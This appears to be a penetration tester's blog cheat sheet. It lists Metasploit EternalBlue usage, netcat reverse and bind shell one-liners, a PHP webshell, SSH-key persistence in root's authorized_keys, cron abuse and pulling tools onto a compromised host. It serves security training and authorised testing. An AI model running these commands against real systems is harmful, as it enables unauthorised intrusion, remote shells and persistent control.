---
layout: single
title: Exploitation Cheat Sheet
date: 2026-01-07
classes: wide
header:
  teaser: /assets/images/cheatsheet.png
  teaser_home_page: true
categories:
  - Cheat Sheets
tags:
  - cheatsheets
---

# Introduction
-----

This is the **Shell & Coffee exploitation cheat sheet** that I will be actively updating through commits as needed.

<br>
# Exploits
-------------

| **Public Exploits**                                                                                      |                                                                               |
| -------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| [https://swisskyrepo.github.io/PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings) | PayloadsAllTheThings                                                          |
| [https://book.hacktricks.wiki/en/index.html](https://book.hacktricks.wiki/en/index.html)                 | HackTricks                                                                    |
| `keyword` exploit                                                                                        | Simple search on the internet                                                 |
| `searchsploit [keyword]`                                                                                 | Search for public exploits for a web application                              |
| `searchsploit -m php/webapps/51042.txt`                                                                  | Get the PoC or exploit script                                                 |
| `msfconsole`                                                                                             | MSF: Start the Metasploit Framework                                           |
| `search exploit eternalblue`                                                                             | MSF: Search for public exploits in MSF                                        |
| `use exploit/windows/smb/ms17_010_psexec`                                                                | MSF: Start using an MSF module                                                |
| `show options`                                                                                           | MSF: Show required options for an MSF module                                  |
| `set RHOSTS [ip]`<br>`set LHOSTS [interface]`                                                            | MSF: Set a value for an MSF module option                                     |
| `check`                                                                                                  | MSF: Test if the target server is vulnerable (not supported in some exploits) |
| `exploit`                                                                                                | MSF: Run the exploit on the target server.                                    |

<br>
# Shells
---------

| **Shells**                                                                                                                                                                           |                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------ |
| `nc -lvnp [port]`                                                                                                                                                                    | Start a `nc` `l`istener, `v`erbose mode, `D`NS resolution disabled in a local `p`ort |
| [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) | Reverse shells cheat sheet.                                                          |
| [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)       | Bind shells cheat sheet.<br>                                                         |
| `nc [ip] [port]`                                                                                                                                                                     | Connect to a bind shell started on the remote server                                 |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc [ip] [port] >/tmp/f` (reverse)<br>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp [port] >/tmp/f` (bind)    | Forward Shells                                                                       |
| `script /dev/null -c bash`<br>`ctrl+z`<br>`stty raw -echo; fg`<br>`reset xterm`<br>`export TERM=xterm`<br>`export SHELL=bash`<br>`stty rows 45 columns 184`                          | TTY upgrading                                                                        |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                                                                                                                     | TTY upgrading (python)                                                               |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                                                                                                                    | Create a webshell php file                                                           |
| `curl http://[ip]/shell.php?cmd=id`                                                                                                                                                  | Execute a command on an uploaded webshell                                            |

<br>
# Post-Exploitation
-------

| **Post-Exploitation**                                                        |                                                                                                                                                                                           |
| ---------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PrivEsc**                                                                  |                                                                                                                                                                                           |
| [https://gtfobins.org/](https://gtfobins.org/)                               | GTFOBins                                                                                                                                                                                  |
| [https://lolbas-project.github.io/](https://lolbas-project.github.io/)       | LOLBAS                                                                                                                                                                                    |
| `./linpeas.sh`                                                               | Run `linpeas` script to enumerate remote server                                                                                                                                           |
| `./lse.sh`                                                                   | Run `lse` script to enumerate remote server                                                                                                                                               |
| `sudo -l`                                                                    | List available `sudo` privileges                                                                                                                                                          |
| `sudo -u user /bin/echo pwned`                                               | Run a command with `sudo`                                                                                                                                                                 |
| `sudo su -`                                                                  | Switch to root user (if we have access to `sudo su`)                                                                                                                                      |
| `sudo su user -`                                                             | Switch to a user (if we have access to `sudo su`)                                                                                                                                         |
| `find / -perm -4000 -ls 2>/dev/null`                                         | Find SUID binaries                                                                                                                                                                        |
| `ssh-keygen -f key`                                                          | Create a new SSH key                                                                                                                                                                      |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user                                                                                                                                                  |
| `ssh [user]@[ip] -i key`                                                     | SSH to the server with the generated private key                                                                                                                                          |
| `crontab -l`                                                                 | Cron jobs of my user                                                                                                                                                                      |
| `systemctl list-timers`                                                      | Time left to execute each job                                                                                                                                                             |
| `/etc/crontab`<br>`/etc/cron.d`<br>`/var/spool/cron/crontabs/root`           | Write access to any of those files will allow us to to add new cron jobs. Also if we can write to a directory called by a cron job, we can write a reverse shell and it will be executed. |
| `./pspy`                                                                     | Analyze running cron jobs                                                                                                                                                                 |
| `getcap .r & 2>/dev/null`                                                    | Capabilities search in the system                                                                                                                                                         |
| **Transferring Files**                                                       |                                                                                                                                                                                           |
| `python3 -m http.server [port]`                                              | Start a local webserver                                                                                                                                                                   |
| `wget http://[ip]:[port]/linpeas.sh`                                         | Download a file on the remote server from our local machine                                                                                                                               |
| `curl http://[ip]:[port]/linenum.sh -o linenum.sh`                           | Download a file on the remote server from our local machine                                                                                                                               |
| `scp linenum.sh [user]@[ip]:/tmp/linenum.sh`                                 | Transfer a file to the remote server with `scp` (requires SSH access)                                                                                                                     |
| `base64 shell -w 0`                                                          | Convert a file to `base64`                                                                                                                                                                |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                            | Convert a file from `base64` back to its orig                                                                                                                                             |
| `md5sum shell`                                                               | Check the file's `md5sum` to ensure it converted correctly                                                                                                                                |










